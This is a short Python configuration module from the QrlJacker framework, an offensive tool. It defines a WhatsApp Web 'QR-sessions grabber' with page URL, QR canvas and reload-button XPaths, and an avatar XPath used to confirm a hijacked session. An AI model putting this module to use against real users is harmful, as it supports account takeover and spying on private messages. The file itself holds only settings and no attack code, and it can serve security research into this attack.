# -*- coding: utf-8 -*-
# Written by: Karim shoair - D4Vinci ( QrlJacker-Framework )
from core.module_utils import types

class info:
    author            = "Karim Shoair (D4Vinci)"
    short_description = "Whatsapp QR-sessions grabber and controller"
    full_description  = None

class execution:
    module_type       = types.grabber
    name              = "whatsapp"
    url               = "https://web.whatsapp.com"
    image_xpath       = '/html/body/div[1]/div/div/div[3]/div[1]/div/div/div[2]/div/canvas'
    img_reload_button = '/html/body/div[1]/div/div/div[3]/div[1]/div/div/div[2]/div/span/button'
    change_identifier = '/html/body/div[1]/div/div/div[4]/header/div[1]/div'
    
    #
    # documentation for "change_identifier":
    #
    # The xpath of the Avatar image is used as an identifier ("change_identifier" variable):
    # if it is found it means that we are on the Chat page and therefore we have obtained a 
    # valid session
    #
    # Avatar image for Android: '/html/body/div[1]/div/div/div[4]/header/div[1]/div/img'
    # Avatar image for IOS:     '/html/body/div[1]/div/div/div[4]/header/div[1]/div/div/span'
    #
    # Common XPath for both 
    # platforms:                '/html/body/div[1]/div/div/div[4]/header/div[1]/div'
    #
    # Over time the xpath of these items may change. If you encounter problems it is recommended 
    # to check the source code of the Whatsapp web page to verify the new xpaths and possibly 
    # change this configuration file
    #

    session_type      = "profile"